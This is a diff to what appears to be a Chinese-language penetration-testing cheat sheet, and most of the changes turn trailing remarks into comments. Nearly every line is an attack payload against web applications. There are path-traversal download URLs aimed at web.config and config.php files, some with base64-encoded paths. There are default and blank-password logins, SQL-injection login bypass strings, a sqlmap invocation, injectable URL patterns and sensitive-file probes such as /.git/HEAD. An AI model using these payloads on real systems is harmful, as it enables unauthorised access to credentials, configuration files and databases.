@@ -13,13 +13,13 @@ ashx_prod_file.ashx?file_path=../web.config
 get_file.php?file_name=../../include/setup.php
 file_download.aspx?fileN=/Web&fileP=Web.config
 file.php?f=../../../include/app_top.php
-Download.ashx?u=L3dlYi5jb25maWc=&n=bm1tYmE=        参数base64编码
+Download.ashx?u=L3dlYi5jb25maWc=&n=bm1tYmE=        #参数base64编码
 download.aspx?path=..\&file=web.config
 download.aspx?table_name=&filename=../web.config
 download.aspx?dlfn=../web.config
 systemi/downloads.php?ServerFilename=../systemi/config.php
 DownFile.aspx?pid=311502&fileName=../../../web.config
-/download.php?file=YXR0YWNobWVudHMvcGhuZXQvY29tcGFueS9GMS54bHM=  路径base64编码
+/download.php?file=YXR0YWNobWVudHMvcGhuZXQvY29tcGFueS9GMS54bHM=   #路径base64编码
 saveas.php?url=/admin/includes/config.php
 getfile.ashx?filen=../web.config
 readimage.php?file=../../../../../include/config.inc.php
@@ -28,27 +28,27 @@ readimage.php?file=../../../../../include/config.inc.php
 
 ### 弱密碼 (Weak Passwords)
 ```
-管理員使用預設帳號密碼(admin, 1234)
 弱口令訪問 admin /admin
-帳號密碼通通留白
+管理員使用預設帳號密碼(admin, 1234)
+帳號密碼通通留白         #什么都不输，直接点登陆
 帳號密碼 dia:dia
 s1 / test
 test / test 
-帳號: admin 密碼: gss (gss为网站域名)
+帳號: admin 密碼: gss   #gss为网站域名
 ```
 
 
 
 ### SQL
 ```
-' or 1=1--   aspx
+' or 1=1--    #aspx
 帳號: admin 密碼: 'or''='
 帳號: 'or'=1 密碼: 'or'=1
 帳號: " or "=' 密碼: " or "='
 帳號: ' OR 2=2 -- 密碼: ' OR 2=2 --
 index.php?kid=
 ktv_01.asp?ID=27
-/index.php/meeting/index/cat_id/8'  sqlmap -u /index.php/meeting/index/cat_id/8\*   \* 为自定义参数
+/index.php/meeting/index/cat_id/8'    #sqlmap -u /index.php/meeting/index/cat_id/8\*   \* 为自定义参数
 index_show.php?fr=i&id=3159
 edu_nthsbbs_new.php?acttype=show&id=A20190200062
 news-detail.php?id=81
@@ -69,7 +69,7 @@ Adobe ColdFusion
 ### 敏感信息泄露
 ```
 inurl:sybase_environment.inc
-/.git/HEAD
+/.git/HEAD        #单单访问/.git/ 会403，看来以后爆破目录，勾上403很重要
 sa.sql
 vpn.doc proxy.doc
 ```
